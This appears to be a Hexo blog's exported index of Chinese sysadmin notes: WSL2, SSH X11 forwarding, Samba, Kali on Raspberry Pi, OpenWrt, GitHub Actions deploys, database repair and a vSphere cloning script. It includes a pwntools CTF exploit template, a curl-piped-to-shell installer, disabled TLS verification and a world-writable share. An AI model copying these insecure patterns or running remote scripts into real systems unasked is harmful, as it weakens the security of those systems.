--default-user xyzz</code></pre><p>如果是全新的import之后会无法直接ubuntu或者wsl -d ubuntu<br>进入wsl</p><pre><code class="bash">tee /etc/wsl.conf &lt;&lt;_EOF[user]default=$&#123;NEW_USER&#125;_EOF</code></pre><p>然后<code>wsl --shutdown ubuntu</code></p><p>使用最原始的系统<br>具体下载地址<a href="https://docs.microsoft.com/zh-cn/windows/wsl/install-manual">https://docs.microsoft.com/zh-cn/windows/wsl/install-manual</a></p><pre><code class="bash">curl.exe -L -o ubuntu2004.appx https://aka.ms/wslubuntu2004</code></pre><p>也可以直接浏览器下载<br>安装</p><pre><code class="bash">Add-AppxPackage ./ubuntu2004.appx</code></pre><h2 id="wsl2安装docker"><a href="#wsl2安装docker" class="headerlink" title="wsl2安装docker"></a>wsl2安装docker</h2><p>我比较懒，就直接用docker-ce，没使用wsl2做后段的docker deskotp了。等有时间试试再回来补充<br>不过目前的docker无法<code>systemctl restart docker</code><br>只能<code>systemctl start docker</code>或者<code>sudo service docker start</code><br>不过目前<code>systemctl enable docker</code>不可以随着虚拟机启动就启动</p><h3 id="wsl2-docker设置proxy"><a href="#wsl2-docker设置proxy" class="headerlink" title="wsl2 docker设置proxy"></a>wsl2 docker设置proxy</h3><p>之前的方法不管用了，我也不知道咋办<br>目前有一个不太稳的办法<br>就是修改<code>/etc/default/docker</code>这个文件<br>把http_proxy放开，不过不能用域名，只能用ip<br>算是一个bug吧</p><h2 id="wsl2-git"><a href="#wsl2-git" class="headerlink" title="wsl2 git"></a>wsl2 git</h2><p>会出现换行符错乱的情况</p><pre><code class="bash">git config --global core.autocrlf true</code></pre><p>设置为windows linux 换行符一致</p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wsl2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程连接的一些笔记</title>
      <link href="/2020/08/28/yuan-cheng-lian-jie-de-yi-xie-bi-ji/"/>
      <url>/2020/08/28/yuan-cheng-lian-jie-de-yi-xie-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>主要是远程到远程服务器的一些用法</p><ol><li>ssh配合xserver达到远程应用图像显示到本地</li><li>linux下smb文件共享</li></ol><h2 id="ssh-xserver"><a href="#ssh-xserver" class="headerlink" title="ssh+xserver"></a>ssh+xserver</h2><h3 id="server配置"><a href="#server配置" class="headerlink" title="server配置"></a>server配置</h3><p>编辑<code>/etc/ssh/sshd_config</code><br>修改下面的值</p><pre><code class="bash">X11Forwarding yesX11DisplayOffset 10</code></pre><p>一条命令</p><pre><code class="bash">sudo sed -i &#39;s/#X11Forwarding yes/X11Forwarding yes/g&#39; /etc/ssh/sshd_config;sudo sed -i &#39;s/#X11DisplayOffset 10/X11DisplayOffset 10/g&#39; /etc/ssh/sshd_config;sudo systemctl restart sshd;</code></pre><h3 id="无桌面的server"><a href="#无桌面的server" class="headerlink" title="无桌面的server"></a>无桌面的server</h3><p>centos</p><pre><code class="bash">yum install -y xorg-x11-xauth xorg-x11-utils xorg-x11-fonts-*</code></pre><p>ubuntu&#x2F;debian</p><pre><code class="bash">sudo apt-get install -y x11-apps;</code></pre><h3 id="windows客户端"><a href="#windows客户端" class="headerlink" title="windows客户端"></a>windows客户端</h3><p>mobaxterm一把梭</p><h3 id="mac客户端"><a href="#mac客户端" class="headerlink" title="mac客户端"></a>mac客户端</h3><p>先安装xquartz</p><pre><code class="bash">brew cask install xquartz</code></pre><p>然后修改配置文件<code>/private/etc/ssh/ssh_config</code><br>个人感觉可以是<code>/private/etc/ssh/ssh_config</code>也可以是直接<code>/etc/ssh/ssh_config</code><br>把<code>ForwardX11 yes</code>的注释取消<br>并且添加<code>ForwardX11Trusted yes</code><br><img src="/img/2020/08/28/xserver_success.png" alt="xserver_success"><br>这样也可以远程进行sublime text3进行编辑了</p><p>附带一个pwntools用的脚本</p><pre><code class="python">#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *from binascii import *BINARY_FILE = &#39;./pwn&#39;REMOTE = (&#39;127.0.0.1&#39;, 10000)def setup_connection():    binary, libc, preload = None, None, False    local_libc = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;    task_libc = &#39;./libc.so.6&#39;    env = &#123;&#125;    if args.PRELOAD:        local_libc = task_libc        env = &#123;&#39;LD_PRELOAD&#39;: task_libc&#125;    if args.BINARY:        binary = ELF(BINARY_FILE)        context.arch = binary.arch    if args.REMOTE:        if args.LIBC:            libc = ELF(task_libc)        s = remote(*REMOTE)    else:        if args.LIBC:            libc = ELF(local_libc)                s = process(BINARY_FILE, stderr=open(&#39;/dev/null&#39;, &#39;w+&#39;), env=env)        if args.GDB:            context.terminal = [&#39;gnome-terminal&#39;, &#39;-e&#39;]            breakpoints = [0x400001, 0x400002]              gdb.attach(s, exe=BINARY_FILE, gdbscript=&#39;\n&#39;.join([&#39;b *&#39;+str(x) for x in breakpoints]))                return s, binary, libcif __name__ == &#39;__main__&#39;:    s, binary, libc = setup_connection()    context.update(arch = &#39;amd64&#39;)</code></pre><h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>安装</p><pre><code class="bash">sudo apt-get install samba</code></pre><p>目录配置,最好用一个单独的目录并且chmod 777</p><pre><code class="bash">[share]      path = dir_path      available = yes      browseable = yes      public = yes      writable = yes</code></pre><p>设置登陆用户</p><pre><code class="bash">sudo touch /etc/samba/smbpasswd;sudo smbpasswd -a smb;sudo service smbd restart</code></pre>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派安装kali</title>
      <link href="/2020/08/24/shu-mei-pai-an-zhuang-kali/"/>
      <url>/2020/08/24/shu-mei-pai-an-zhuang-kali/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>树莓派4b安装kali2020.3</p><h2 id="安装后开放ssh"><a href="#安装后开放ssh" class="headerlink" title="安装后开放ssh"></a>安装后开放ssh</h2><pre><code class="bash">sudo apt-get update;sudo apt-get install -y ufw;sudo ufw allow 22;sudo reboot;</code></pre><p>目前发现需要重启才生效</p><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><pre><code class="bash">sudo sed -i &quot;s/http.kali.org/mirrors.aliyun.com/g&quot; /etc/apt/sources.list;sudo apt-get update;export DEBIAN_FRONTEND=noninteractive;sudo apt-get install sudo wget curl unzip netcat htop autojump unrar net-tools vim bash zsh git ttf-wqy-microhei ttf-wqy-zenhei xfonts-intl-chinese -y;</code></pre><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><pre><code class="bash">curl https://github.com/chnxyzz.keys &gt;&gt; ~/.ssh/authorized_keys;sudo chmod 600 ~/.ssh/authorized_keys;sudo sed -i &#39;s/#PasswordAuthentication yes/PasswordAuthentication no/g&#39; /etc/ssh/sshd_config;sudo systemctl enable ssh &amp;&amp; sudo systemctl restart ssh;</code></pre><h2 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h2><pre><code class="bash">curl https://raw.githubusercontent.com/chnxyzz/linux_install/master/vim/vimrc.txt -o ~/.vimrc;sudo cp ~/.vimrc /root/.vimrc;</code></pre><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><pre><code class="bash">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/chnxyzz/oh-my-zsh/master/tools/install.sh)&quot;;</code></pre><h2 id="换时区"><a href="#换时区" class="headerlink" title="换时区"></a>换时区</h2><pre><code class="bash">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime;echo &#39;Asia/Shanghai&#39; &gt;/etc/timezone;</code></pre><h2 id="设置locale"><a href="#设置locale" class="headerlink" title="设置locale"></a>设置locale</h2><pre><code class="bash">echo &quot;export LC_ALL=en_US.UTF-8&quot;  &gt;&gt;  /etc/profileecho &quot;export LC_CTYPE=en_US.UTF-8&quot;  &gt;&gt;  /etc/profile</code></pre><h2 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h2><pre><code class="bash">export swapfile=/swap.img;sudo swapoff $swapfile;sudo dd if=/dev/zero of=$swapfile bs=4k count=512k;sudo mkswap $swapfile;sudo swapon $swapfile;</code></pre>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
          <category> devops </category>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Raspberrypi </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>esxi搭建opwnert</title>
      <link href="/2020/08/22/esxi-da-jian-opwnert/"/>
      <url>/2020/08/22/esxi-da-jian-opwnert/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>使用esxi7.0安装openwrt19.07.3<br>openwrt做旁路由<br>并且配置出全局代理，保证网络的唯一稳定</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="下载opwnwrt"><a href="#下载opwnwrt" class="headerlink" title="下载opwnwrt"></a>下载opwnwrt</h3><p>我使用的是</p><pre><code class="bash">https://downloads.openwrt.org/releases/19.07.3/targets/x86/64/openwrt-19.07.3-x86-64-combined-ext4.img.gz</code></pre><h3 id="转变成esxi可用的vmdk"><a href="#转变成esxi可用的vmdk" class="headerlink" title="转变成esxi可用的vmdk"></a>转变成esxi可用的vmdk</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul><li>StarWind V2V Converter</li><li>Local file </li><li>选择镜像文件 </li><li>VMware ESX server image</li><li>Next </li><li>Next</li></ul><h4 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h4><pre><code class="bash">gunzip openwrt-x86-generic-combined-ext4.img.gzqemu-img convert -f raw -O vmdk openwrt-x86-generic-combined-ext4.img openwrt-x86-generic-combined-ext4.vmdk</code></pre><h3 id="esxi新建虚拟机"><a href="#esxi新建虚拟机" class="headerlink" title="esxi新建虚拟机"></a>esxi新建虚拟机</h3><ul><li>kernel版本看<code>https://openwrt.org/packages/pkgdata/kernel</code></li><li>第一个网络选wan</li><li>第二个网络选lan</li><li>替换硬盘</li><li>引导选择bios</li></ul><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><pre><code class="bash">cp /etc/opkg/distfeeds.conf /etc/opkg/distfeeds.conf.bak;sed -i &#39;s_downloads.openwrt.org_mirrors.bfsu.edu.cn/openwrt_&#39; /etc/opkg/distfeeds.conf;</code></pre><h3 id="安装中文支持"><a href="#安装中文支持" class="headerlink" title="安装中文支持"></a>安装中文支持</h3><pre><code class="bash">opkg update;opkg install luci-i18n-base-zh-cn;</code></pre><h3 id="替换中文"><a href="#替换中文" class="headerlink" title="替换中文"></a>替换中文</h3><p>web里面操作</p><h3 id="安装必要的库"><a href="#安装必要的库" class="headerlink" title="安装必要的库"></a>安装必要的库</h3><pre><code class="bash">libustream-openssl20150806zshgitcurl</code></pre><h3 id="后面的一切"><a href="#后面的一切" class="headerlink" title="后面的一切"></a>后面的一切</h3><p>参考(<a href="https://github/openwrt">https://github/openwrt</a>)</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本来想的是openwrt接的lan1是172.16.0.0&#x2F;16<br>openwrt接管172.16.1.0&#x2F;24<br>然后下面接的主机可以直接通过172的段进行访问，后来发现怎么设置都不行。所以退而求其次，用了wan-lan都方式，不过这样的话的确很轻松的搞定了。</p>]]></content>
      
      
      <categories>
          
          <category> trick </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Esxi </tag>
            
            <tag> Openwrt </tag>
            
            <tag> FullProxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云cos+cdn对hexo的支持和github action对cos的支持</title>
      <link href="/2020/08/17/teng-xun-yun-cos-cdn-dui-hexo-de-zhi-chi-he-github-action-dui-cos-de-zhi-chi/"/>
      <url>/2020/08/17/teng-xun-yun-cos-cdn-dui-hexo-de-zhi-chi-he-github-action-dui-cos-de-zhi-chi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>由于github托管的blog在国内访问的很慢，所以为了优化一下，</p><p>决定在Tencent Cloud上搭建一个分站<br>共以下几点</p><ul><li>cos+cdn对静态网站对部署，并且配置https</li><li>github action添加自动部署到cos的job</li><li>使用google search 和百度站长</li></ul><h3 id="cos-cdn"><a href="#cos-cdn" class="headerlink" title="cos+cdn"></a>cos+cdn</h3><p>首先部署cos，这个很简单</p><ul><li><p>设置一下静态网站，选择强制开启https，添加下403之间跳到index.html<br><img src="/img/2020/08/17/staticweb_setting.png" alt="staticweb_setting"></p></li><li><p>然后域名管理里面打开默认CDN加速域名，并且配置好自定义CDN加速域名和自定义源站域名</p></li><li><p>可以选择开启日志管理，方便自己查看</p></li><li><p>存储桶访问权限为公有读私有写</p></li></ul><h3 id="cdn-https"><a href="#cdn-https" class="headerlink" title="cdn+https"></a>cdn+https</h3><h4 id="https"><a href="#https" class="headerlink" title="https:"></a>https:</h4><ul><li>cdn的界面里面，证书管理配好，用nginx格式的ssl证书，证书之间用免费的就行</li><li>回源协议选择https</li></ul><h4 id="cdn"><a href="#cdn" class="headerlink" title="cdn"></a>cdn</h4><ul><li>缓存过期配置我设置为全文件1分钟</li><li>开启回源跟随301&#x2F;302配置</li><li>关闭Range回源配置</li><li>开启HTTP2.0配置和强制跳转</li></ul><p>自己走的一个最大的坑就是URL重写配置，里面写了一条<code>^.*/</code>到<code>/index.html</code>导致了302 301无限的循环，中间也去掉过并且等了几个小时，然后还是没有改变，第二天在去掉就神奇的好了，可能这就是cdn的神奇魔力吧。</p><h3 id="github-action对tencent-cloud的支持"><a href="#github-action对tencent-cloud的支持" class="headerlink" title="github action对tencent cloud的支持"></a>github action对tencent cloud的支持</h3><p>在action文件里面加上这几个step就行了</p><pre><code class="yaml">name: CIon:  push:    branches: [ master ]    jobs:  build:    runs-on: ubuntu-latest    env:      local_dir: ./public/      remote_dir: /      thread: 10      region: accelerate      bucket: &quot;&quot;      ignore: &quot;./.git*,*.DS_Store&quot;    steps:    - uses: actions/checkout@v2    - name: Set up Python      uses: actions/setup-python@v1      with:        python-version: 3.6    - name: install coscmd      run: |        python -m pip install --upgrade pip        python -m pip install setuptools coscmd    - name: upload to cos      run: |        coscmd config -a &quot;$&#123;&#123;secrets.TENCENTCLOUD_SECRET_ID&#125;&#125;&quot; -s &quot;$&#123;&#123;secrets.TENCENTCLOUD_SECRET_KEY&#125;&#125;&quot; -b $bucket -r $region -m $thread         coscmd upload -r -s $local_dir $remote_dir --ignore &quot;$ignore&quot;</code></pre><p>由于github在国外，所以直接推送原始域名失败的概率还是很高的，所以开启储存桶的全球加速，使用<code>accelerate</code>进行上传<br>其中推送到cos只需要上传pulibc文件夹下面的文件就行，通过<code>diff -ruNa public .deploy_git &gt; ../1.txt</code>可以看到，他们的差异只存在于<code>.git</code>文件夹中</p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> COS </tag>
            
            <tag> CDN </tag>
            
            <tag> github action </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github action的一些用法及hexo自动部署</title>
      <link href="/2020/08/15/github-action-de-yi-xie-yong-fa-ji-hexo-zi-dong-bu-shu/"/>
      <url>/2020/08/15/github-action-de-yi-xie-yong-fa-ji-hexo-zi-dong-bu-shu/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>主要用github action做了两个自动化部署</p><ul><li>github pages的自动部署</li><li>利用github仓库进行docker的自动build，并且定时跟新</li><li>利用docker镜像恢复dockerfile</li></ul><h2 id="github-pages的自动部署"><a href="#github-pages的自动部署" class="headerlink" title="github pages的自动部署"></a>github pages的自动部署</h2><h3 id="修改hexo的-config-yml"><a href="#修改hexo的-config-yml" class="headerlink" title="修改hexo的_config.yml"></a>修改hexo的_config.yml</h3><pre><code class="yaml">deploy:  type: git  #repo: https://github.com/chnxyzz/chnxyzz.github.io.git  repo: https://GITHUB_TOKEN@github.com/chnxyzz/chnxyzz.github.io.git  branch: master  name: chnxyzz  email: 28676240+chnxyzz@users.noreply.github.com</code></pre><h3 id="添加github-action"><a href="#添加github-action" class="headerlink" title="添加github_action"></a>添加github_action</h3><pre><code class="yaml">name: build and deployon:  push:    branches: masterjobs:  build:    runs-on: ubuntu-latest    env:      GITHUB_TOKEN: $&#123;&#123;secrets.POST_TOKEN&#125;&#125;    steps:      - uses: actions/checkout@v2      - uses: actions/setup-node@v1        with:          node-version: 14          registry-url: https://registry.npmjs.org/      - name: build and deploy        run: |          npm install -g hexo-cli          npm install          sed -i &quot;s/GITHUB_TOKEN/$&#123;&#123;secrets.POST_TOKEN&#125;&#125;/g&quot; ./_config.yml          hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre><h2 id="docker自动部署"><a href="#docker自动部署" class="headerlink" title="docker自动部署"></a>docker自动部署</h2><p>给定dockerfile，就可以自动build并且push到dockerhub上</p><h3 id="docker官方用的"><a href="#docker官方用的" class="headerlink" title="docker官方用的"></a>docker官方用的</h3><pre><code class="yaml">name: docker build CIon:  push:    branches: [ master ]jobs:  build:    runs-on: ubuntu-latest    steps:    - uses: actions/checkout@v2    - name: build and push      uses: docker/build-push-action@v1      with:        username: $&#123;&#123; secrets.DOCKER_USERNAME &#125;&#125;        password: $&#123;&#123; secrets.DOCKER_PASSWORD &#125;&#125;        repository: xyzzpwn/hexo_dev        tags: latest</code></pre><h3 id="自己写的，可以用于打上时间的tag，然后不断的叠加push"><a href="#自己写的，可以用于打上时间的tag，然后不断的叠加push" class="headerlink" title="自己写的，可以用于打上时间的tag，然后不断的叠加push"></a>自己写的，可以用于打上时间的tag，然后不断的叠加push</h3><pre><code class="yaml">name: Docker Image CIon:  push:    branches: [ master ]  schedule:    - cron: &#39;50 23 * * 6&#39;    jobs:  build:    runs-on: ubuntu-latest    steps:    - uses: actions/checkout@v2    - name: Build the Docker image      run: |        sudo ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime;        sudo echo &#39;Asia/Shanghai&#39; &gt;/etc/timezone;        echo $&#123;&#123; secrets.DOCKER_PASSWORD &#125;&#125; | docker login --username $&#123;&#123; secrets.DOCKER_USERNAME &#125;&#125; --password-stdin        export con_name=xyzzpwn/hexo        export con_time_name=$con_name:$(date +%Y%m%d%H%M%S)        export con_relese_name=$con_name:latest        docker build . --file ./Dockerfile --tag $con_time_name        docker push $con_time_name        docker tag $con_time_name $con_relese_name        docker push $con_relese_name</code></pre><p>有时间希望能做成一个和build-push-action一样的即插即用的github action项目<br>并且可以把deploy github pages 拓展到push到各个仓库</p><h2 id="利用docker镜像恢复dockerfile"><a href="#利用docker镜像恢复dockerfile" class="headerlink" title="利用docker镜像恢复dockerfile"></a>利用docker镜像恢复dockerfile</h2><h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><p>docker history 然后反转</p><pre><code class="bash">#!/bin/bashif [ $# -eq 1 ];then        docker history --format &#123;&#123;.CreatedBy&#125;&#125; --no-trunc=true $1 |sed &quot;s/\/bin\/sh\ -c\ \#(nop)\ //g&quot;|sed &quot;s/\/bin\/sh\ -c/RUN/g&quot; | tac    else        echo &quot;sh $0 Docker_image_name&quot;fi</code></pre><h3 id="通过hash找docker镜像"><a href="#通过hash找docker镜像" class="headerlink" title="通过hash找docker镜像"></a>通过hash找docker镜像</h3><pre><code class="bash">docker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2</code></pre><p>所以有需要的时候把docker中所有常用的docker image名字收集起来，通过不断的docker pull来进行尝试<br>还有一种方法</p><pre><code class="bash">docker pull ubuntu --all-tags</code></pre><p>把所有镜像下载本地，做成一个数据库，不过太耗费流量了。而且实时性不强。</p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> Github action </tag>
            
            <tag> Reverse Dockerfile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修复停电后服务器故障</title>
      <link href="/2020/08/14/xiu-fu-ting-dian-hou-fu-wu-qi-gu-zhang/"/>
      <url>/2020/08/14/xiu-fu-ting-dian-hou-fu-wu-qi-gu-zhang/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>停电后，esxi重启，出现以下问题</p><ul><li>vsphere center到重做日志已损坏</li><li>centos7 system损坏</li><li>上台centos7部署的nextcloud中的mariadb损坏</li></ul><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="vsphere-center"><a href="#vsphere-center" class="headerlink" title="vsphere center"></a>vsphere center</h2><p>直接采用快照回滚，然后重新连接esxi，修改配置，进行快照</p><h2 id="centos7-system损坏"><a href="#centos7-system损坏" class="headerlink" title="centos7 system损坏"></a>centos7 system损坏</h2><p>为保险起见，先用kali——live-cd挂载进去，拿到了data中的数据，发现数据可以拿出，放到其他上面备份，发现系统盘不可读<br>经过检查，是&#x2F;dev&#x2F;mapper&#x2F;centos-root出了问题<br>开机加入rescue模式<br>或者</p><pre><code class="bash">rw single=/sysroot/bin/sh</code></pre><p>之后使用xfs_repair修复</p><pre><code class="bash">ls -l /dev/mapper;xfs_repair /dev/mapper/centos-root;xfs_repair -L /dev/mapper/centos-root;init 6</code></pre><h2 id="docker部署的mariadb损坏"><a href="#docker部署的mariadb损坏" class="headerlink" title="docker部署的mariadb损坏"></a>docker部署的mariadb损坏</h2><p>首先修改docker-compose.yml</p><pre><code class="bash">services:  db:    image: mariadb    #command: --transaction-isolation=READ-COMMITTED --binlog-format=ROW    command: --innodb-force-recovery=2</code></pre><p>进入备份nextcloud数据库</p><pre><code class="bash">docker exec -it nextcloud_db_1 /bin/bashmysql -uroot -pmysqlcheck --all-databases -uroot -pmysqldump -h 127.0.0.1 -u root -ppassword nextcloud &gt; nextcloud.sql;</code></pre><p>修改回docker-compose.yml，并删除一些脏数据</p><pre><code class="bash">rm -i ib*;rm core.*;</code></pre><p>这时候mariadb就可以正常启动了，先删除nextcloud数据库的文件然后恢复数据库</p><pre><code class="bash">rm -rf ./nextcloud/*mysql -uroot -pdrop database nextcloud;create database nextcloud;use nextcloud;source nextcloud.sql;</code></pre><p>修复全部完成,打好快照备用。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有时间应该弄一个自动叠带快照的脚本，每隔一定时间自动打一次快照，并且自动保存最新的3-5个快照。</p>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xfs </tag>
            
            <tag> Mariadb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo主题更换加npm升级</title>
      <link href="/2020/08/14/hexo-zhu-ti-geng-huan-jia-npm-sheng-ji/"/>
      <url>/2020/08/14/hexo-zhu-ti-geng-huan-jia-npm-sheng-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="更换hexo主题"><a href="#更换hexo主题" class="headerlink" title="更换hexo主题"></a>更换hexo主题</h1><p>从yilia换到matery<br>所有大写在github page会出现错误，所以更改名称</p><pre><code class="bash">cd themes;git clone https://github.com/blinkfox/hexo-theme-matery.git;</code></pre><p>添加npm包</p><pre><code class="bash">npm i -S hexo-prism-plugin;npm install hexo-generator-search --save;npm i hexo-permalink-pinyin --save;npm i --save hexo-wordcount;</code></pre><h1 id="更新hexo的包"><a href="#更新hexo的包" class="headerlink" title="更新hexo的包"></a>更新hexo的包</h1><p>之前的包还是两年前的，用npm进行更新</p><pre><code class="bash">npm install -g npm-checknpm-checknpm install -g npmnpm install -g npm-upgradenpm-upgradenpm update rm -rf node_modules &amp;&amp; npm install --force</code></pre><p>国内源不可audit,</p><pre><code class="bash">npm ERR! code ENOAUDITnpm ERR! audit Your configured registry (https://registry.npm.taobao.org/) does not support audit requests.npm ERR! A complete log of this run can be found in:npm ERR!     /root/.npm/_logs/2020-08-15T15_40_57_743Z-debug.log</code></pre><p>换回去</p><pre><code class="bash">npm config set registry https://registry.npmjs.orgnpm auditnpm audit fix</code></pre>]]></content>
      
      
      <categories>
          
          <category> repair </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git清空所有记录</title>
      <link href="/2020/08/14/git-qing-kong-suo-you-ji-lu/"/>
      <url>/2020/08/14/git-qing-kong-suo-you-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="git的一些操作"><a href="#git的一些操作" class="headerlink" title="git的一些操作"></a>git的一些操作</h1><h2 id="清空所有commit"><a href="#清空所有commit" class="headerlink" title="清空所有commit"></a>清空所有commit</h2><pre><code class="bash">git checkout --orphan latest_branch;git add -A;git commit -m &quot;commit message&quot;;git branch -D master;git branch -m master;git push -f origin master;</code></pre><h2 id="清空远程仓库"><a href="#清空远程仓库" class="headerlink" title="清空远程仓库"></a>清空远程仓库</h2><p>不清空.git直接清空仓库文件就git pull下来。删了所有文件，然后三连</p><pre><code class="bash">git add . &amp;&amp; git commit -m &quot;delall&quot; &amp;&amp; git push</code></pre><h2 id="gitignore不起作用"><a href="#gitignore不起作用" class="headerlink" title="gitignore不起作用"></a>gitignore不起作用</h2><pre><code class="bash">git rm -r --cached .git add .git commit -m &#39;update .gitignore&#39; </code></pre>]]></content>
      
      
      <categories>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> clear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsphere 即时克隆</title>
      <link href="/2020/08/13/vsphere-ji-shi-ke-long/"/>
      <url>/2020/08/13/vsphere-ji-shi-ke-long/</url>
      
        <content type="html"><![CDATA[<h1 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h1><p>vsphere6.7即以上的instant clone，使用脚本进行设置<br>属于能用就行的东西，不想优化</p><span id="more"></span><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><pre><code class="bash">conda create -n vsphere python=3.7source activate vsphereorconda activate vspherepython -m pip install -i https://mirrors.aliyun.com/pypi/simple pyvmomi</code></pre><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><p>instant_clone.py</p><pre><code class="python"># encoding=utf-8from common import infoimport atexitimport requests.packages.urllib3 as urllib3import sslfrom pyVmomi import vimfrom pyVim.connect import SmartConnect, Disconnectimport timefrom tools import tasks&quot;&quot;&quot; Waits and provides updates on a vSphere task&quot;&quot;&quot;def WaitTask(task, actionName=&#39;job&#39;, hideResult=True):    #print &#39;Waiting for %s to complete.&#39; % actionName      if task ==None:        return &#39;no value&#39;    while task.info.state == vim.TaskInfo.State.running:        time.sleep(1)     print(task.info)    if task.info.state == vim.TaskInfo.State.success:       if task.info.result is not None and not hideResult:          out = &#39;%s completed successfully, result: %s&#39; % (actionName, task.info.result)       else:          out = &#39;%s completed successfully.&#39; % actionName    else:       out = &#39;%s did not complete successfully: %s&#39; % (actionName, task.info.error)       print(out)       raise task.info.error # should be a Fault... check XXX    # may not always be applicable, but can&#39;t hurt.    return task.info.resultdef get_obj(content, vimtype, name, folder=None):    obj = None    if not folder:        folder = content.rootFolder    container = content.viewManager.CreateContainerView(folder, vimtype, True)    for item in container.view:        if item.name == name:            obj = item            break    return obj# 开始连接vcentersi = Nonecontext = Noneif hasattr(ssl, &#39;SSLContext&#39;):    context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)    context.verify_mode = ssl.CERT_NONEif context:    si = SmartConnect(host=info.host, port=int(info.port), user=info.user,                      pwd=info.password, sslContext=context)atexit.register(Disconnect, si)print(&quot;Connected to vCenter Server&quot;)content = si.RetrieveContent()# 获取datacenterdatacenter = get_obj(content, [vim.Datacenter], info.datacenter_name)if not datacenter:    raise Exception(&quot;Couldn&#39;t find the Datacenter with the provided name &quot; &quot;&#39;&#123;&#125;&#39;&quot;.format(info.datacenter_name))def instant_clone(new_vm_name,template_name,ResourcePool=&#39;即时克隆&#39;):    # 获取vm    vm_folder = datacenter.vmFolder    vm_template = get_obj(content, [vim.VirtualMachine], template_name, vm_folder)    if not vm_template:        raise Exception(&quot;Couldn&#39;t find the template with the provided name &quot;                        &quot;&#39;&#123;&#125;&#39;&quot;.format(template_name))    #写定位置,这里是资源池    InstantClone_location = vim.vm.RelocateSpec()    InstantClone_location.pool=get_obj(content, [vim.ResourcePool], ResourcePool)    #即时克隆参数    InstantClonespec = vim.vm.InstantCloneSpec()    InstantClonespec.location =  InstantClone_location    InstantClonespec.name = new_vm_name    #即时克隆    InstantClone_task=vm_template.InstantClone(InstantClonespec)    tasks.wait_for_tasks(si,[InstantClone_task])    # new_vm = WaitTask(InstantClone_task, &#39;VM InstantClone task&#39;)    #进行重启    rebook_task=InstantClone_task.info.result.RebootGuest()    reboot_result = WaitTask(rebook_task, &#39;VM Reboot task&#39;)    print(new_vm_name,reboot_result)    # tasks.wait_for_tasks(si,[rebook_task])    # print(new_vm_name,&#39;Reboot ok&#39;)def main():    new_vm_name_list=[&#39;123&#39;,&#39;456&#39;]    